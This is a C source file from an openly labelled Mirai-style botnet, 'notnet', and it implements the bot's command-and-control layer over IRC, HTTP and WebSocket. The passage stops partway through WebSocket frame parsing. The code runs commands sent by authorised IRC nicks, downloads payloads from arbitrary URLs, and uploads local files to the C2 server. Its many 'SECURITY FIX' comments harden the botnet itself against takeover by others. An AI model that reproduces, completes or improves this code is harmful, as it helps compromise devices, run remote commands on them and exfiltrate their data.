/*
 * notnet - Modern Mirai-Style Botnet
 * protocol.c - C2 protocol implementation (IRC, HTTP, WebSocket)
 */
#include "protocol.h"
#include "spread.h"
#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <stdarg.h>

/* ── IRC Implementation ───────────────────────────────────────── */
static int irc_create_socket(notnet_bot_t *bot) {
    /* SECURITY FIX (#3): Use AF_INET + IPPROTO_TCP (not IPPROTO_IPV6).
     * The previous code requested an IPv6 protocol on an IPv4 socket,
     * which fails silently on most platforms. */
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        log_error("IRC: socket() failed: %s", strerror(errno));
        return -1;
    }
    
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    /* Set non-blocking for connect timeout */
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(bot->c2_irc.port);
    
    /* SECURITY FIX (#3): Use inet_pton instead of gethostbyname + memcpy.
     * gethostbyname returns h_length which can be 16 for IPv6 results,
     * overflowing the 4-byte sin_addr. inet_pton with AF_INET strictly
     * accepts dotted-quad and rejects hostnames. For hostname resolution
     * use getaddrinfo with AF_INET filtering. */
    if (inet_pton(AF_INET, bot->c2_irc.server, &addr.sin_addr) != 1) {
        /* Not a dotted-quad; try DNS resolution and use safe copy */
        int resolved = protocol_resolve_host(bot->c2_irc.server);
        if (resolved == (int)INADDR_NONE) {
            log_error("IRC: DNS resolution failed for %s", bot->c2_irc.server);
            close(sock);
            return -1;
        }
        addr.sin_addr.s_addr = (in_addr_t)resolved;
        if (addr.sin_addr.s_addr == INADDR_NONE) {
            log_error("IRC: invalid address for %s", bot->c2_irc.server);
            close(sock);
            return -1;
        }
    }
    
    /* SECURITY FIX (#10): DNS pinning — on reconnect, verify the resolved
     * IP matches the pinned IP from the first successful auth. */
    if (bot->c2_irc.dns_pinned) {
        if (addr.sin_addr.s_addr != bot->c2_irc.pinned_addr.s_addr) {
            log_warn("IRC: DNS rebinding detected! Pinned %s, resolved %s — rejecting",
                     inet_ntoa(bot->c2_irc.pinned_addr), inet_ntoa(addr.sin_addr));
            close(sock);
            return -1;
        }
    }
    
    /* Non-blocking connect with select() timeout */
    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (connect_err < 0 && errno != EINPROGRESS) {
        log_error("IRC: connect() failed: %s", strerror(errno));
        close(sock);
        return -1;
    }
    
    /* Wait for connection with 3s timeout */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    
    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
        log_error("IRC: connect() timed out");
        close(sock);
        return -1;
    }
    
    /* Check for connect error */
    int so_error;
    socklen_t len = sizeof(so_error);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
    if (so_error != 0) {
        log_error("IRC: connect() failed: %s", strerror(so_error));
        close(sock);
        return -1;
    }
    
    /* Restore blocking mode for data transfer */
    fcntl(sock, F_SETFL, flags);
    
    return sock;
}

int irc_connect(notnet_bot_t *bot) {
    if (bot->c2_irc.connected) return 0;
    
    int sock = irc_create_socket(bot);
    if (sock < 0) return -1;
    
    bot->c2_irc.sock = sock;
    bot->c2_irc.connected = 1;
    bot->c2_irc.last_ping = time(NULL);
    
    log_info("IRC: connected to %s:%d", bot->c2_irc.server, bot->c2_irc.port);
    
    /* Send PASS if configured (loaded from config or env) */
    if (bot->c2_irc.pass[0] != '\0') {
        irc_send(bot, "PASS %s", bot->c2_irc.pass);
    }
    
    /* Send NICK and USER */
    /* SECURITY FIX (#5): Generate a random nick to make impersonation harder */
    {
        char rand_suffix[8];
        random_string(rand_suffix, sizeof(rand_suffix));
        snprintf(bot->c2_irc.nick, sizeof(bot->c2_irc.nick), "%s%s", IRC_NICK_PREFIX, rand_suffix);
        irc_send(bot, "NICK %s", bot->c2_irc.nick);
        irc_send(bot, "USER %s 0 * :notnet bot", bot->c2_irc.nick);
    }
    
    return 0;
}

int irc_send(notnet_bot_t *bot, const char *format, ...) {
    if (!bot->c2_irc.connected) return -1;
    
    char buf[512];
    va_list args;
    va_start(args, format);
    vsnprintf(buf, sizeof(buf), format, args);
    va_end(args);
    
    /* Ensure IRC protocol termination */
    char full_cmd[516];
    snprintf(full_cmd, sizeof(full_cmd), "%s\r\n", buf);
    
    int sent = send(bot->c2_irc.sock, full_cmd, strlen(full_cmd), 0);
    if (sent < 0) {
        log_error("IRC: send() failed: %s", strerror(errno));
        return -1;
    }
    if (sent < (int)strlen(full_cmd)) {
        log_warn("IRC: partial send (%d of %zu bytes)", sent, strlen(full_cmd));
    }
    
    return sent;
}

int irc_read(notnet_bot_t *bot, char *buf, int len) {
    if (!bot->c2_irc.connected) return -1;
    
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(bot->c2_irc.sock, &fds);
    tv.tv_sec = 0;
    tv.tv_usec = 0;
    
    if (select(bot->c2_irc.sock + 1, &fds, NULL, NULL, &tv) <= 0) return 0;
    
    int received = recv(bot->c2_irc.sock, buf, len, 0);
    if (received <= 0) {
        log_info("IRC: connection closed");
        bot->c2_irc.connected = 0;
        close(bot->c2_irc.sock);
        bot->c2_irc.sock = -1;
        return -1;
    }
    
    /* Process IRC response */
    buf[received] = '\0';
    
    /* Check for PING - must be at start of line for IRC server PING */
    if (strncmp(buf, "PING", 4) == 0) {
        char host[256] = {0};
        char *ping = strstr(buf, "PING");
        char *colon = ping ? strchr(ping, ':') : NULL;
        if (colon) {
            colon++; /* skip colon */
            /* skip leading space after colon */
            while (*colon == ' ') colon++;
            if (*colon) {
                strncpy(host, colon, sizeof(host) - 1);
                host[sizeof(host) - 1] = '\0';
            }
        }
        if (host[0]) {
            irc_send(bot, "PONG %s", host);
            log_debug("IRC: ponged %s", host);
        } else {
            irc_send(bot, "PONG");
        }
    }
    
    /* Check for JOIN confirmation (366 End of NAMES)
     * SECURITY FIX (#29): Use strncmp on the IRC numeric response format
     * instead of strstr("366"). The old check matched any occurrence of
     * "366" anywhere in the buffer, including in PRIVMSG text, allowing
     * any user to trigger false authentication. */
    if (strncmp(buf, ":", 1) == 0) {
        char *space = strchr(buf + 1, ' ');
        if (space) {
            char *code = space + 1;
            /* Format: :server 366 client #chan :End of NAMES list */
            if (strncmp(code, "366", 3) == 0 && (code[3] == ' ' || code[3] == '\0')) {
                log_info("IRC: joined channel %s", bot->c2_irc.channel);
                bot->c2_irc.authenticated = 1;
                /* SECURITY FIX (#10): Pin the connected peer IP on first auth */
                if (!bot->c2_irc.dns_pinned) {
                    struct sockaddr_in sin;
                    socklen_t slen = sizeof(sin);
                    getpeername(bot->c2_irc.sock, (struct sockaddr *)&sin, &slen);
                    bot->c2_irc.pinned_addr = sin.sin_addr;
                    bot->c2_irc.dns_pinned = 1;
                    log_info("IRC: DNS pin set to %s", inet_ntoa(sin.sin_addr));
                }
            }
        }
    }

    /* Check for MOTD complete (376 End of MOTD) - sets authenticated for non-channels mode
     * SECURITY FIX (#29): Same strstr("376") false-match issue as above. */
    if (strncmp(buf, ":", 1) == 0) {
        char *space = strchr(buf + 1, ' ');
        if (space) {
            char *code = space + 1;
            if (strncmp(code, "376", 3) == 0 && (code[3] == ' ' || code[3] == '\0')) {
                log_info("IRC: MOTD complete, authenticated");
                bot->c2_irc.authenticated = 1;
                /* SECURITY FIX (#10): Pin the connected peer IP on first auth */
                if (!bot->c2_irc.dns_pinned) {
                    struct sockaddr_in sin;
                    socklen_t slen = sizeof(sin);
                    getpeername(bot->c2_irc.sock, (struct sockaddr *)&sin, &slen);
                    bot->c2_irc.pinned_addr = sin.sin_addr;
                    bot->c2_irc.dns_pinned = 1;
                    log_info("IRC: DNS pin set to %s", inet_ntoa(sin.sin_addr));
                }
            }
        }
    }

    /* Process PRIVMSG commands */
    char *privmsg = strstr(buf, "PRIVMSG");
    if (privmsg) {
        /* SECURITY FIX (#5): Verify sender nick against allowlist.
         * IRC PRIVMSG format: :sender_nick!user@host PRIVMSG target :message
         * The nick is the text between the leading ':' and the first '!'. */
        char sender_nick[32] = {0};
        char *colon = buf;  /* buf starts with :nick!user@host ... */
        if (*colon == ':') {
            colon++; /* skip leading colon */
            char *bang = strchr(colon, '!');
            if (bang) {
                int nick_len = bang - colon;
                if (nick_len > 31) nick_len = 31;
                memcpy(sender_nick, colon, nick_len);
                sender_nick[nick_len] = '\0';
            }
        }

        /* Check sender against authorized nicks */
        int authorized = 0;
        for (int i = 0; i < bot->c2_irc.auth_nick_count && i < 8; i++) {
            if (strcmp(sender_nick, bot->c2_irc.auth_nicks[i]) == 0) {
                authorized = 1;
                break;
            }
        }
        /* SECURITY FIX (#11): Constant-time auth check. Instead of
         * returning immediately for unauthorized senders (timing oracle),
         * add a random delay to mask the early return path. */
        if (!authorized) {
            /* Random delay 10-50ms to mask timing differences */
            usleep(10000 + (rand() % 40000));
            log_warn("IRC: PRIVMSG from unauthorized nick '%s' ignored", sender_nick);
            return 0;
        }

        /* Find the message part after the channel name */
        colon = strchr(privmsg, ':');
        if (colon) {
            colon++; /* skip the colon, point to message text */
            /* Trim trailing \r\n */
            int msg_len = strlen(colon);
            while (msg_len > 0 && (colon[msg_len - 1] == '\r' || colon[msg_len - 1] == '\n' || colon[msg_len - 1] == ' ')) {
                colon[--msg_len] = '\0';
            }
            /* Copy full message text as the command (e.g. "exec uname -a") */
            int cmd_len = msg_len;
            if (cmd_len > len - 1) cmd_len = len - 1;
            memmove(buf, colon, cmd_len);
            buf[cmd_len] = '\0';
            log_info("IRC: command: %s", buf);
            return 1; /* signal new command */
        }
    }
    
    return 0;
}

void irc_disconnect(notnet_bot_t *bot) {
    if (bot->c2_irc.connected) {
        bot->c2_irc.connected = 0;
        if (bot->c2_irc.sock >= 0) {
            close(bot->c2_irc.sock);
            bot->c2_irc.sock = -1;
        }
        log_info("IRC: disconnected");
    }
}

/* ── HTTP Implementation ───────────────────────────────────────── */
int http_connect(notnet_bot_t *bot) {
    if (bot->c2_http.connected) return 0;
    
    log_info("HTTP: attempting connect to %s:%d", bot->c2_http.server, bot->c2_http.port);
    
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;
    
    /* Non-blocking connect */
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(bot->c2_http.port);
    
    /* SECURITY FIX (#3): Use inet_pton + safe fallback instead of
     * gethostbyname + memcpy (h_length overflow on IPv6 results). */
    if (inet_pton(AF_INET, bot->c2_http.server, &addr.sin_addr) != 1) {
        addr.sin_addr.s_addr = (in_addr_t)protocol_resolve_host(bot->c2_http.server);
        if (addr.sin_addr.s_addr == INADDR_NONE) {
            close(sock);
            return -1;
        }
    }
    
    /* SECURITY FIX (#10): DNS pinning for HTTP C2 */
    if (bot->c2_http.dns_pinned && addr.sin_addr.s_addr != bot->c2_http.pinned_addr.s_addr) {
        log_warn("HTTP: DNS rebinding detected! Pinned %s, resolved %s — rejecting",
                 inet_ntoa(bot->c2_http.pinned_addr), inet_ntoa(addr.sin_addr));
        close(sock);
        return -1;
    }
    
    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (connect_err < 0 && errno != EINPROGRESS) {
        close(sock);
        return -1;
    }
    
    /* Wait with 3s timeout */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    
    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
        close(sock);
        return -1;
    }
    
    int so_error;
    socklen_t len = sizeof(so_error);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
    if (so_error != 0) {
        close(sock);
        return -1;
    }
    
    fcntl(sock, F_SETFL, flags);
    
    bot->c2_http.sock = sock;
    bot->c2_http.connected = 1;
    /* SECURITY FIX (#10): Pin IP on first successful HTTP connection */
    if (!bot->c2_http.dns_pinned) {
        struct sockaddr_in sin;
        socklen_t slen = sizeof(sin);
        getpeername(sock, (struct sockaddr *)&sin, &slen);
        bot->c2_http.pinned_addr = sin.sin_addr;
        bot->c2_http.dns_pinned = 1;
    }
    log_info("HTTP: connected to %s:%d", bot->c2_http.server, bot->c2_http.port);
    return 0;
}

int http_post(notnet_bot_t *bot, const char *data, int len) {
    if (!bot->c2_http.connected) return -1;
    
    log_info("HTTP: heartbeat sent (%d bytes)", len);
    
    char headers[1024];
    snprintf(headers, sizeof(headers),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/json\r\n"
        "User-Agent: %s\r\n"
        "Content-Length: %d\r\n"
        "Connection: keep-alive\r\n"
        "\r\n",
        bot->c2_http.path, bot->c2_http.server, bot->c2_http.user_agent, len);
    
    /* SECURITY FIX (#28): Check send() return values to detect connection
     * drops. Previously sent headers+body without checking if they were
     * actually transmitted. */
    int sent = send(bot->c2_http.sock, headers, strlen(headers), 0);
    if (sent < 0) {
        log_warn("HTTP: failed to send headers: %s", strerror(errno));
        return -1;
    }
    sent = send(bot->c2_http.sock, data, len, 0);
    if (sent < 0 || sent < len) {
        log_warn("HTTP: failed to send body (sent %d of %d): %s", sent, len, strerror(errno));
        return -1;
    }

    return 0;
}

int http_get(notnet_bot_t *bot, char *buf, int len) {
    if (!bot->c2_http.connected) return -1;
    
    char req[1024];
    snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        bot->c2_http.path, bot->c2_http.server, bot->c2_http.user_agent);
    
    int sent = send(bot->c2_http.sock, req, strlen(req), 0);
    if (sent < 0) {
        log_warn("HTTP: GET send failed: %s", strerror(errno));
        return -1;
    }
    
    /* Read response with 10s timeout to prevent indefinite blocking */
    int total = 0;
    while (total < len - 1) {
        fd_set read_fds;
        struct timeval tv;
        FD_ZERO(&read_fds);
        FD_SET(bot->c2_http.sock, &read_fds);
        tv.tv_sec = 10;
        tv.tv_usec = 0;

        int sel = select(bot->c2_http.sock + 1, &read_fds, NULL, NULL, &tv);
        if (sel <= 0) break;  /* timeout or error */

        int received = recv(bot->c2_http.sock, buf + total, len - total - 1, 0);
        if (received <= 0) break;
        total += received;
    }
    buf[total] = '\0';
    
    return total;
}

int http_read(notnet_bot_t *bot, char *buf, int len) {
    if (!bot->c2_http.connected) return -1;
    
    log_info("HTTP: http_read polling fd %d...", bot->c2_http.sock);
    
    /* Read response from existing connection (non-blocking) */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(bot->c2_http.sock, &fds);
    tv.tv_sec = 0;
    tv.tv_usec = 0;
    
    int sel_result = select(bot->c2_http.sock + 1, &fds, NULL, NULL, &tv);
    log_info("HTTP: http_read select returned %d", sel_result);
    if (sel_result <= 0) return 0;
    
    int received = recv(bot->c2_http.sock, buf, len, 0);
    log_info("HTTP: http_read recv returned %d", received);
    if (received <= 0) {
        log_info("HTTP: connection closed (recv=%d)", received);
        bot->c2_http.connected = 0;
        close(bot->c2_http.sock);
        bot->c2_http.sock = -1;
        return -1;
    }
    
    log_info("HTTP: received %d bytes: %.200s", received, buf);
    buf[received] = '\0';
    return received;
}

/* Open a fresh blocking TCP connection to host:port with a 3s timeout.
 * Returns socket fd on success, -1 on failure. Caller must close. */
static int tcp_connect_sock(notnet_bot_t *bot, const char *host, uint16_t port) {
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;

    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
        in_addr_t resolved = (in_addr_t)protocol_resolve_host(host);
        if (resolved == INADDR_NONE) {
            close(sock);
            return -1;
        }
        addr.sin_addr.s_addr = resolved;
    }

    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (connect_err < 0 && errno != EINPROGRESS) {
        close(sock);
        return -1;
    }

    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 3;
    tv.tv_usec = 0;

    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
        close(sock);
        return -1;
    }

    int so_error;
    socklen_t len = sizeof(so_error);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
    if (so_error != 0) {
        close(sock);
        return -1;
    }

    fcntl(sock, F_SETFL, flags);
    (void)bot;
    return sock;
}

int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
    /* Parse the target URL. Fall back to the configured C2 endpoint
     * when url is NULL/empty so the old callers keep working. */
    char host[256];
    uint16_t port;
    char path[512];

    if (url && strncmp(url, "http://", 7) == 0) {
        char authority[256];
        const char *p = url + 7;
        const char *slash = strchr(p, '/');
        size_t alen = slash ? (size_t)(slash - p) : strlen(p);
        if (alen == 0 || alen >= sizeof(authority)) {
            log_error("HTTP download: malformed URL %s", url);
            return -1;
        }
        memcpy(authority, p, alen);
        authority[alen] = '\0';

        snprintf(host, sizeof(host), "%s", authority);
        port = 80;
        char *colon = strrchr(host, ':');
        if (colon) {
            *colon = '\0';
            port = (uint16_t)atoi(colon + 1);
            if (port == 0) port = 80;
        }
        if (slash) snprintf(path, sizeof(path), "%s", slash);
        else snprintf(path, sizeof(path), "/");
    } else {
        snprintf(host, sizeof(host), "%s", bot->c2_http.server);
        port = bot->c2_http.port;
        snprintf(path, sizeof(path), "%s", bot->c2_http.path);
    }

    /* Use a stack buffer — single-threaded, callers don't recurse.
     * Avoids static buffer being overwritten by concurrent downloads. */
    char buf[PAYLOAD_MAX_SIZE];
    char *body = NULL;
    int body_len = 0;

    int sock = tcp_connect_sock(bot, host, port);
    if (sock < 0) {
        log_error("http_download: connect to %s:%u failed", host, port);
        return -1;
    }

    char req[1024];
    int reqlen = snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, host, bot->c2_http.user_agent);

    if (send(sock, req, reqlen, 0) != reqlen) {
        log_warn("http_download: GET send failed: %s", strerror(errno));
        close(sock);
        return -1;
    }

    /* Read response with 10s timeout to prevent indefinite blocking */
    int total = 0;
    while (total < (int)sizeof(buf) - 1) {
        fd_set read_fds;
        struct timeval tv;
        FD_ZERO(&read_fds);
        FD_SET(sock, &read_fds);
        tv.tv_sec = 10;
        tv.tv_usec = 0;

        int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
        if (sel <= 0) break;  /* timeout or error */

        int received = recv(sock, buf + total, (int)sizeof(buf) - total - 1, 0);
        if (received <= 0) break;
        total += received;
    }
    buf[total] = '\0';
    close(sock);

    if (total <= 0) {
        log_error("http_download: empty response from %s:%u", host, port);
        return -1;
    }

    /* Simple HTTP response parsing - skip headers */
    char *hdr_end = strstr(buf, "\r\n\r\n");
    if (!hdr_end) {
        log_error("http_download: malformed HTTP response from %s:%u", host, port);
        return -1;
    }
    body = hdr_end + 4;
    body_len = total - (int)(body - buf);

    /* SECURITY FIX (#6): Enforce PAYLOAD_MAX_SIZE on body length. */
    if (body_len > PAYLOAD_MAX_SIZE) {
        log_error("HTTP download: body exceeds PAYLOAD_MAX_SIZE (%d > %d)",
                  body_len, PAYLOAD_MAX_SIZE);
        return -1;
    }
    if (body_len <= 0) return -1;

    FILE *f = fopen(dest, "wb");
    if (!f) return -1;
    fwrite(body, 1, body_len, f);
    fclose(f);

    return body_len;
}

int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_path) {
    /* Read local file into memory */
    FILE *f = fopen(file_path, "rb");
    if (!f) {
        log_error("http_upload: cannot open %s: %s", file_path, strerror(errno));
        return -1;
    }

    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (file_size <= 0 || file_size > PAYLOAD_MAX_SIZE) {
        log_error("http_upload: invalid file size %ld", file_size);
        fclose(f);
        return -1;
    }

    char *file_data = (char *)malloc(file_size);
    if (!file_data) {
        log_error("http_upload: malloc failed for %ld bytes", file_size);
        fclose(f);
        return -1;
    }

    size_t nread = fread(file_data, 1, file_size, f);
    fclose(f);

    if ((long)nread != file_size) {
        log_error("http_upload: short read (%zu of %ld)", nread, file_size);
        free(file_data);
        return -1;
    }

    /* Use configured C2 endpoint or specific URL */
    char host[256];
    uint16_t port;
    char path[512];

    if (upload_path && strncmp(upload_path, "http://", 7) == 0) {
        char authority[256];
        const char *p = upload_path + 7;
        const char *slash = strchr(p, '/');
        size_t alen = slash ? (size_t)(slash - p) : strlen(p);
        if (alen == 0 || alen >= sizeof(authority)) {
            log_error("http_upload: malformed URL %s", upload_path);
            free(file_data);
            return -1;
        }
        memcpy(authority, p, alen);
        authority[alen] = '\0';

        snprintf(host, sizeof(host), "%s", authority);
        port = 80;
        char *colon = strrchr(host, ':');
        if (colon) {
            *colon = '\0';
            port = (uint16_t)atoi(colon + 1);
            if (port == 0) port = 80;
        }
        if (slash) snprintf(path, sizeof(path), "%s", slash);
        else snprintf(path, sizeof(path), "/");
    } else {
        snprintf(host, sizeof(host), "%s", bot->c2_http.server);
        port = bot->c2_http.port;
        snprintf(path, sizeof(path), "%s", upload_path ? upload_path : bot->c2_http.path);
    }

    /* Connect to server */
    int sock = tcp_connect_sock(bot, host, port);
    if (sock < 0) {
        log_error("http_upload: connect to %s:%u failed", host, port);
        free(file_data);
        return -1;
    }

    /* Build POST request with Content-Length */
    char headers[1024];
    int hdr_len = snprintf(headers, sizeof(headers),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %ld\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, host, file_size, bot->c2_http.user_agent);

    if (send(sock, headers, hdr_len, 0) != hdr_len) {
        log_warn("http_upload: headers send failed: %s", strerror(errno));
        close(sock);
        free(file_data);
        return -1;
    }

    /* Send file body */
    int sent = send(sock, file_data, file_size, 0);
    free(file_data);

    if (sent < 0 || sent < file_size) {
        log_warn("http_upload: body send failed (sent %d of %ld): %s", sent, file_size, strerror(errno));
        close(sock);
        return -1;
    }

    /* Read response with timeout */
    char buf[1024];
    int total = 0;
    while (total < (int)sizeof(buf) - 1) {
        fd_set read_fds;
        struct timeval tv;
        FD_ZERO(&read_fds);
        FD_SET(sock, &read_fds);
        tv.tv_sec = 10;
        tv.tv_usec = 0;

        int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
        if (sel <= 0) break;

        int received = recv(sock, buf + total, (int)sizeof(buf) - total - 1, 0);
        if (received <= 0) break;
        total += received;
    }
    buf[total] = '\0';
    close(sock);

    log_info("http_upload: uploaded %ld bytes to %s, response: %.200s", file_size, path, buf);
    return file_size;
}

void http_disconnect(notnet_bot_t *bot) {
    if (bot->c2_http.connected) {
        bot->c2_http.connected = 0;
        if (bot->c2_http.sock >= 0) {
            close(bot->c2_http.sock);
            bot->c2_http.sock = -1;
        }
        log_info("HTTP: disconnected");
    }
}

/* ── WebSocket Implementation ─────────────────────────────────────── */
int ws_connect(notnet_bot_t *bot) {
    if (bot->c2_ws.connected) return 0;
    
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;
    
    /* Non-blocking connect */
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(bot->c2_ws.port);
    
    /* SECURITY FIX (#3): Use inet_pton + safe fallback instead of
     * gethostbyname + memcpy (h_length overflow on IPv6 results). */
    if (inet_pton(AF_INET, bot->c2_ws.server, &addr.sin_addr) != 1) {
        addr.sin_addr.s_addr = (in_addr_t)protocol_resolve_host(bot->c2_ws.server);
        if (addr.sin_addr.s_addr == INADDR_NONE) {
            close(sock);
            return -1;
        }
    }
    
    /* SECURITY FIX (#10): DNS pinning for WebSocket C2 */
    if (bot->c2_ws.dns_pinned && addr.sin_addr.s_addr != bot->c2_ws.pinned_addr.s_addr) {
        log_warn("WS: DNS rebinding detected! Pinned %s, resolved %s — rejecting",
                 inet_ntoa(bot->c2_ws.pinned_addr), inet_ntoa(addr.sin_addr));
        close(sock);
        return -1;
    }
    
    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (connect_err < 0 && errno != EINPROGRESS) {
        close(sock);
        return -1;
    }
    
    /* Wait with 3s timeout */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    
    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
        close(sock);
        return -1;
    }
    
    int so_error;
    socklen_t len = sizeof(so_error);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
    if (so_error != 0) {
        close(sock);
        return -1;
    }
    
    fcntl(sock, F_SETFL, flags);
    
    bot->c2_ws.sock = sock;
    bot->c2_ws.connected = 1;
    /* SECURITY FIX (#10): Pin IP on first successful WS connection */
    if (!bot->c2_ws.dns_pinned) {
        struct sockaddr_in sin;
        socklen_t slen = sizeof(sin);
        getpeername(sock, (struct sockaddr *)&sin, &slen);
        bot->c2_ws.pinned_addr = sin.sin_addr;
        bot->c2_ws.dns_pinned = 1;
    }
    log_info("WS: connected to %s:%d", bot->c2_ws.server, bot->c2_ws.port);
    
    return 0;
}

/* ── WebSocket Protocol Helpers ───────────────────────────────── */
/* SECURITY FIX (#22): Implement proper RFC 6455 WebSocket framing.
 * Previously ws_send/ws_read sent/received raw data without frame headers. */

/* Generate a random 4-byte masking key for client-to-server frames */
static void ws_make_mask(uint8_t *mask) {
    mask[0] = rand() & 0xFF;
    mask[1] = rand() & 0xFF;
    mask[2] = rand() & 0xFF;
    mask[3] = rand() & 0xFF;
}

/* Apply WebSocket mask to payload data in-place */
static void ws_apply_mask(uint8_t *data, size_t len, const uint8_t *mask) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= mask[i % 4];
    }
}

int ws_send(notnet_bot_t *bot, const char *data, int len) {
    if (!bot->c2_ws.connected) return -1;

    /* Build RFC 6455 frame:
     * Byte 0: FIN(1) + RSV(0) + Opcode(1=text)
     * Byte 1: MASK(1, client must mask) + Payload len(7)
     * Then: 4-byte mask key
     * Then: masked payload */
    uint8_t header[14];  /* max header size for 64-bit payload length */
    int hdr_len = 0;

    /* FIN bit set + opcode 1 (text frame) */
    header[hdr_len++] = 0x81;

    /* Masking bit set (client-to-server) */
    uint8_t mask[4];
    ws_make_mask(mask);

    if (len < 126) {
        header[hdr_len++] = 0x80 | (uint8_t)len;
    } else if (len < 65536) {
        header[hdr_len++] = 0x80 | 126;
        header[hdr_len++] = (len >> 8) & 0xFF;
        header[hdr_len++] = len & 0xFF;
    } else {
        header[hdr_len++] = 0x80 | 127;
        for (int i = 7; i >= 0; i--) {
            header[hdr_len++] = (len >> (i * 8)) & 0xFF;
        }
    }

    /* Append mask key */
    memcpy(header + hdr_len, mask, 4);
    hdr_len += 4;

    /* Copy data to a temp buffer for masking */
    /* SECURITY FIX (#25): Use dynamic allocation for masked payload to
     * avoid silent truncation of messages > 2048 bytes. */
    int send_len = len;
    char *masked = (char *)malloc(send_len);
    if (!masked) {
        log_error("ws_send: malloc failed for %d bytes", send_len);
        return -1;
    }
    memcpy(masked, data, send_len);
    ws_apply_mask((uint8_t *)masked, send_len, mask);

    /* Send header + masked payload */
    int hdr_sent = send(bot->c2_ws.sock, header, hdr_len, 0);
    if (hdr_sent < 0) {
        log_warn("ws_send: header send failed: %s", strerror(errno));
        free(masked);
        return -1;
    }
    int result = send(bot->c2_ws.sock, masked, send_len, 0);
    free(masked);
    return result;
}

int ws_read(notnet_bot_t *bot, char *buf, int len) {
    if (!bot->c2_ws.connected) return -1;

    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(bot->c2_ws.sock, &fds);
    tv.tv_sec = 0;
    tv.tv_usec = 0;

    if (select(bot->c2_ws.sock + 1, &fds, NULL, NULL, &tv) <= 0) return 0;

    /* Read frame header (2 bytes minimum) */
    uint8_t frame_hdr[2];
    int r = recv(bot->c2_ws.sock, frame_hdr, 2, 0);
    if (r <= 0) {
        bot->c2_ws.connected = 0;
        if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
        bot->c2_ws.sock = -1;
        return -1;
    }

    int fin = (frame_hdr[0] & 0x80) >> 7;
    int opcode = frame_hdr[0] & 0x0F;
    (void)fin;  /* FIN bit: not checking fragmentation (C2 messages are small) */
    int masked = (frame_hdr[1] & 0x80) >> 7;
    uint8_t payload_len = frame_hdr[1] & 0x7F;

    /* Determine actual payload length */
    int plen = payload_len;
    if (plen == 126) {
        uint8_t ext[2] = {0};
